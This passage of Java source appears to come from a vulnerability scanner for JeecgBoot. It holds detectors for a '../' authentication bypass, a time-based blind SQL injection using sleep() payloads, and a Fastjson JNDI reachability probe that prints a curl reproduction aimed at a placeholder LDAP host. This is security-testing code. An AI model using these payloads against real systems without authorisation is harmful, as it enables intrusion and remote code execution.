            res.trace("A. 直连真实路径（预期被拦）", "GET", h.url(direct), null, d,
                    "若返回鉴权错误，说明存在拦截");
            if (isRst(d)) return res.set(Result.State.ERROR, "请求被重置：" + d.err);

            boolean blocked = has(d, "Token失效") || has(d, "请重新登录")
                    || has(d, "AuthenticationException")
                    || has(d, "401") || has(d, "403") || d.status == 401 || d.status == 403;

            // B. 用 ../ 绕过
            String bypass = ctx.p("api/../" + realPath);
            Http.Resp b = h.get(bypass);
            res.trace("B. ../ 绕过", "GET", h.url(bypass), null, b,
                    "若不再返回鉴权错误，说明绕过成功");
            if (isRst(b)) return res.set(Result.State.MAYBE, "绕过探针被 WAF 重置");

            boolean stillBlocked = has(b, "Token失效") || has(b, "请重新登录")
                    || b.status == 401 || b.status == 403;

            if (!blocked) {
                return res.set(Result.State.SAFE, "直连路径本身未被拦截，无需绕过（或路径不存在）");
            }
            if (stillBlocked) {
                return res.set(Result.State.SAFE, "../ 绕过无效，仍被拦截");
            }

            res.ev("直连被拦（" + d.brief(80) + "），../ 绕过成功（" + b.brief(80) + "）");
            res.repro("curl -s '" + h.url(direct) + "'      # 被拦");
            res.repro("curl -s '" + h.url(bypass) + "'      # 绕过");
            return res.set(Result.State.VULN,
                    "路径穿越绕过鉴权确认（" + ("upload".equals(probeKind) ? "文件上传" : "SSRF/RCE") + "入口暴露）");
        }
    }

    // =================================================================
    // #11 时间盲注
    // =================================================================
    public static class TimeBlind extends Detector {
        public TimeBlind() {
            super("11", "duplicate 时间盲注", "/sys/duplicate/check",
                  "时间盲注", "high", true,
                  "需要伪造 JWT；用 sleep 差分（真延时 vs 无延时）判定，需 Token");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;

            if (ctx.token == null || ctx.token.isEmpty()) {
                return res.set(Result.State.SKIP, "需要 X-Access-Token，未提供则跳过");
            }

            // A. 基线（无延时）
            String basePath = ctx.p("sys/duplicate/check?tableName=sys_log"
                    + "&fieldName=1&fieldVal=1000&dataId=2000");
            Http.Resp base = h.get(basePath);
            res.trace("A. 基线（无 sleep）", "GET", h.url(basePath), null, base, "记录正常耗时");
            if (isRst(base)) return res.set(Result.State.ERROR, "基线被重置：" + base.err);
            long baseMs = base.costMs;

            // B. sleep(5)
            String sleepPath = ctx.p("sys/duplicate/check?tableName=sys_log"
                    + "&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(5))"
                    + "&fieldVal=1000&dataId=2000");
            Http.Resp sl = h.get(sleepPath);
            res.trace("B. sleep(5) 注入", "GET", h.url(sleepPath), null, sl,
                    "若耗时比基线多约 5s 则命中");
            if (isRst(sl)) return res.set(Result.State.ERROR, "注入探针被重置");

            long delta = sl.costMs - baseMs;
            boolean slow = delta >= 4000;

            if (!slow) {
                return res.set(Result.State.SAFE, "无显著延时（基线 " + baseMs + "ms，注入 "
                        + sl.costMs + "ms，差 " + delta + "ms）");
            }

            // C. 反例：sleep(0) 两边都 0
            String negPath = ctx.p("sys/duplicate/check?tableName=sys_log"
                    + "&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(0))"
                    + "&fieldVal=1000&dataId=2000");
            Http.Resp neg = h.get(negPath);
            res.trace("C. 反例 sleep(0)", "GET", h.url(negPath), null, neg,
                    "应无延时，排除接口本身慢");
            long negDelta = neg.costMs - baseMs;
            if (negDelta >= 4000) {
                return res.set(Result.State.MAYBE,
                        "反例同样延时，接口本身可能就慢，需人工复核");
            }

            res.ev("时间差分成立：基线 " + baseMs + "ms，注入 " + sl.costMs
                    + "ms（+" + delta + "ms），反例 " + neg.costMs + "ms");
            res.repro("curl -s '" + h.url(sleepPath) + "' -H 'X-Access-Token: <token>'");
            return res.set(Result.State.VULN, "时间盲注确认（+"
                    + delta + "ms，反例无延时）");
        }
    }

    // =================================================================
    // #19 Fastjson JNDI（只探测可达性 + 报错特征，不发起真实 JNDI）
    // =================================================================
    public static class FastjsonJndi extends Detector {
        public FastjsonJndi() {
            super("19", "Fastjson JNDI 探针",
                  "/api/../jeecgFormDemoController.do", "Fastjson JNDI", "critical", true,
                  "只做无害探测：用 autoType 关闭时的报错特征判定，不发起真实 JNDI 连接");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;

            // 只探测接口可达 + fastjson 存在性（发 @type 探测，不发真实 ldap）
            String path = ctx.p("api/../jeecgFormDemoController.do?interfaceTest="
                    + "__jscan_probe_" + rnd(8));
            String body = "serverUrl=http://127.0.0.1:1/&requestBody=1&requestMethod=GET";
            Http.Resp r = h.postRaw(path, body.getBytes(java.nio.charset.Charset.forName("UTF-8")),
                    "application/x-www-form-urlencoded");
            res.trace("A. 接口可达性（无害探针）", "POST", h.url(path), body, r,
                    "只判断接口是否存在，不发真实 payload");
            if (isRst(r)) return res.set(Result.State.ERROR, "请求被重置：" + r.err);

            boolean exists = r.status > 0 && r.status != 404
                    && (has(r, "success") || has(r, "message") || has(r, "error")
                        || has(r, "exception") || has(r, "jeecg"));

            if (!exists) {
                return res.set(Result.State.SAFE, "接口不可达或不存在");
            }

            res.ev("接口可达（" + r.brief(120) + "）");
            res.ev("【未执行】真实 fastjson @type / JNDI payload —— 需人工授权后手工验证");
            res.repro("# 接口可达，建议手工验证 fastjson：");
            res.repro("curl -s -X POST '" + h.url(path) + "' \\");
            res.repro("  -H 'Content-Type: application/x-www-form-urlencoded' \\");
            res.repro("  --data 'serverUrl=http://YOUR-LDAP/jeecg.txt&requestBody=1&requestMethod=GET'");
            return res.set(Result.State.MAYBE,
                    "接口可达，存在 fastjson 利用面；本工具不自动发 JNDI，需人工确认");
        }
    }
}
